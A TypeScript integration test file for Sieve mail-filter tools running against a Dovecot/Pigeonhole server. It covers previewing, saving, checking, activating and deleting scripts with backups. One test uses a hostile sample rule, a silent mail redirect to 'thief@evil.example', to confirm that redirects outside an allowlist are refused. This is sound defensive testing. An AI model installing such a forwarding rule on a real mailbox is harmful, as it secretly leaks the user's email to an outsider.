/**
 * The Sieve tools end to end against a real Dovecot + Pigeonhole server:
 * status, put (preview and apply), check, activate, delete with backup, and a
 * redirect that is refused unless allowlisted.
 */

import SieveService from '../services/sieve.service.js';
import SieveManager, { BACKUP_PREFIX } from '../services/sieve-manager.service.js';
import { registerSieveReadTools, registerSieveWriteTools } from '../tools/sieve.tool.js';
import type { AccountConfig } from '../types/index.js';
import type { DovecotSieve } from './helpers/dovecot.js';
import { DOVECOT_PASSWORD, startDovecotSieve } from './helpers/dovecot.js';

vi.mock('../safety/audit.js', () => ({ default: { log: vi.fn(async () => undefined) } }));

type Result = { isError?: boolean; content: { text: string }[] };
type Handler = (args: Record<string, unknown>) => Promise<Result>;

let dovecot: DovecotSieve;
let account: AccountConfig;
const sieve = new SieveService();

function tools(allowlist: string[]) {
  const manager = new SieveManager({
    sieve,
    allowlist,
    listFolders: async () => ['INBOX', 'Archive'],
  });
  const handlers = new Map<string, Handler>();
  const fake = {
    registerTool: (name: string, _cfg: unknown, h: Handler) => {
      handlers.set(name, h);
    },
  } as never;
  const connections = { getAccount: () => account } as never;
  registerSieveReadTools(fake, connections, manager);
  registerSieveWriteTools(fake, connections, manager);
  return async (name: string, args: Record<string, unknown> = {}) => {
    const result = await (handlers.get(name) as Handler)({ account: 'dovecot', ...args });
    return { ...result, out: result.content[0]?.text ?? '' };
  };
}

const scripts = async () => sieve.withSession(account, (s) => s.listScripts());

beforeAll(async () => {
  dovecot = await startDovecotSieve();
  account = {
    name: 'dovecot',
    email: 'sieve@example.test',
    username: 'sieve@example.test',
    password: DOVECOT_PASSWORD,
    imap: {
      host: dovecot.host,
      port: dovecot.imapPort,
      tls: false,
      starttls: false,
      verifySsl: false,
    },
    smtp: { host: dovecot.host, port: 25, tls: false, starttls: false, verifySsl: false },
    sieve: {
      enabled: true,
      host: dovecot.host,
      port: dovecot.sievePort,
      tls: false,
      starttls: false,
    },
  };
}, 180_000);

afterAll(async () => {
  await dovecot?.stop();
});

describe('Sieve tools against Dovecot Pigeonhole', () => {
  const call = tools(['me@example.org']);

  it('sieve_status reports ManageSieve with CHECKSCRIPT support', async () => {
    const result = await call('sieve_status');
    expect(result.isError).toBeUndefined();
    expect(result.out).toMatch(/Server-side rules are available/);
    expect(result.out).toMatch(/"version": "1\.0"/);
    expect(result.out).toMatch(/"implementation": ".*Pigeonhole/i);
  });

  it('sieve_put_script previews without saving, then saves with apply', async () => {
    const content =
      'require "fileinto";\nif header :contains "subject" "invoice" { fileinto "Archive"; }\n';
    const preview = await call('sieve_put_script', { name: 'main', content });
    expect(preview.out).toMatch(/^\[PREVIEW\]/);
    expect(await scripts()).toEqual([]);

    const saved = await call('sieve_put_script', { name: 'main', content, apply: true });
    expect(saved.isError).toBeUndefined();
    expect(await sieve.withSession(account, (s) => s.getScript('main'))).toBe(content);
  });

  it('sieve_check_script returns the server error for a broken script', async () => {
    const result = await call('sieve_check_script', { content: 'redirct "x";\n' });
    expect(result.out).toMatch(/REFUSED|Server syntax check: FAILED/);
    expect(result.out).toMatch(/redirct/);
  });

  it('sieve_activate_script activates; disabling all needs disableAll', async () => {
    const done = await call('sieve_activate_script', { name: 'main' });
    expect(done.isError).toBeUndefined();
    expect((await scripts()).find((s) => s.active)?.name).toBe('main');

    const refused = await call('sieve_activate_script', { name: '' });
    expect(refused.isError).toBe(true);
    expect((await scripts()).find((s) => s.active)?.name).toBe('main');
  });

  it('saving over the active script warns it is live and keeps a backup', async () => {
    const before = await sieve.withSession(account, (s) => s.getScript('main'));
    const result = await call('sieve_put_script', {
      name: 'main',
      content: 'keep;\n',
      apply: true,
    });
    expect(result.out).toMatch(/active script, so it is live now/);
    const backup = (await scripts()).find((s) => s.name.startsWith(`${BACKUP_PREFIX}`));
    expect(backup).toBeDefined();
    expect(await sieve.withSession(account, (s) => s.getScript(backup?.name ?? ''))).toBe(before);
  });

  it('refuses a redirect outside the allowlist and saves one inside it', async () => {
    const blocked = await call('sieve_put_script', {
      name: 'fwd',
      content: 'redirect :copy "thief@evil.example";\n',
      apply: true,
    });
    expect(blocked.isError).toBe(true);
    expect((await scripts()).some((s) => s.name === 'fwd')).toBe(false);

    const allowed = await call('sieve_put_script', {
      name: 'fwd',
      // Pigeonhole rejects :copy without its require.
      content: 'require "copy";\nredirect :copy "me@example.org";\n',
      apply: true,
    });
    expect(allowed.isError).toBeUndefined();
    expect((await scripts()).some((s) => s.name === 'fwd')).toBe(true);
  });

  it('refuses deleting the active script; deletes another after a backup', async () => {
    const refused = await call('sieve_delete_script', { name: 'main' });
    expect(refused.isError).toBe(true);

    const backupsBefore = (await scripts()).filter((s) => s.name.startsWith(BACKUP_PREFIX)).length;
    const done = await call('sieve_delete_script', { name: 'fwd' });
    expect(done.isError).toBeUndefined();
    const after = await scripts();
    expect(after.some((s) => s.name === 'fwd')).toBe(false);
    expect(after.filter((s) => s.name.startsWith(BACKUP_PREFIX)).length).toBe(backupsBefore + 1);
  });

  it('disableAll turns every script off', async () => {
    const done = await call('sieve_activate_script', { name: '', disableAll: true });
    expect(done.isError).toBeUndefined();
    expect((await scripts()).some((s) => s.active)).toBe(false);
  });
});
